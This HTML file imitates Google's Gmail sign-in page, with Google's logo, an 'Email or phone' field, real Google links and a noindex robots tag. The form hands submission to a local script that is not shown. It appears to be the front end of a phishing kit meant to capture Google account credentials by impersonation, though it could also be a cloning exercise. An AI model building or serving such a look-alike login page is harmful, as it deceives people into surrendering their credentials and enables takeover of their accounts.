<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description"
        content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
    <meta name="robots" content="noindex, nofollow">
    <title>Gmail</title>
    <link rel="icon" href="https://www.gstatic.com/images/branding/googleg/1x/googleg_standard_color_16dp.png"
        type="image/png">
    <link rel="stylesheet" href="styles.css">
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Google+Sans+Text:wght@400;500&family=Roboto:wght@300;400;500&display=swap"
        rel="stylesheet">
</head>

<body>
    <div class="outer">
        <div class="card">
            <div class="pw-header">
                <div class="g-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48"
                        aria-hidden="true">
                        <path fill="#4285F4"
                            d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z" />
                        <path fill="#34A853"
                            d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z" />
                        <path fill="#FABB05"
                            d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z" />
                        <path fill="#E94235"
                            d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z" />
                    </svg>
                </div>
                <h1 class="heading">Sign in</h1>
                <div class="sub-heading">with your Google Account to continue to Gmail. This account will be
                    available to other Google apps in the browser.</div>
            </div>

            <form id="signInForm" novalidate>
                <div class="field-wrap" id="emailWrap">
                    <div class="field" id="emailField">
                        <input type="email" id="identifierId" class="field-input" placeholder=" "
                            autocomplete="username webauthn" spellcheck="false" autofocus
                            aria-label="Email or phone" name="identifier" dir="ltr"
                            autocapitalize="none" />
                        <label for="identifierId" class="field-label">Email or phone</label>
                    </div>
                </div>
                <div class="err" id="emailErr">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                        fill="#d93025">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                    </svg>
                    <span>Enter an email or phone number</span>
                </div>
                <div>
                    <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="link forgot-link">Forgot email?</a>
                </div>

                <div class="guest-info">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="https://support.google.com/chrome/answer/6130773?hl=en" class="link"
                        target="_blank" rel="noopener">Learn more about using Guest mode</a>
                </div>

                <div class="btn-row">
                    <button type="button" class="btn-text" onclick="window.location.href='https://accounts.google.com/signup/v2/createaccount?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp'">Create account</button>
                    <button type="submit" class="btn-blue">Next</button>
                </div>
            </form>
        </div>
    </div>

    <footer class="gfoot">
        <div class="gfoot-inner">
            <div class="gfoot-lang">
                <select id="lang" aria-label="Change language">
                    <option selected>English (United States)</option>
                    <option>हिन्दी</option>
                    <option>বাংলা</option>
                    <option>తెలుగు</option>
                    <option>मराठी</option>
                    <option>தமிழ்</option>
                    <option>ગુજરાતી</option>
                    <option>ಕನ್ನಡ</option>
                    <option>മലയാളം</option>
                    <option>ਪੰਜਾਬੀ</option>
                </select>
            </div>
            <div class="gfoot-links">
                <a href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a>
                <a href="https://accounts.google.com/TOS?loc=IN&hl=en&privacy=true" target="_blank">Privacy</a>
                <a href="https://accounts.google.com/TOS?loc=IN&hl=en" target="_blank">Terms</a>
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>

</html>
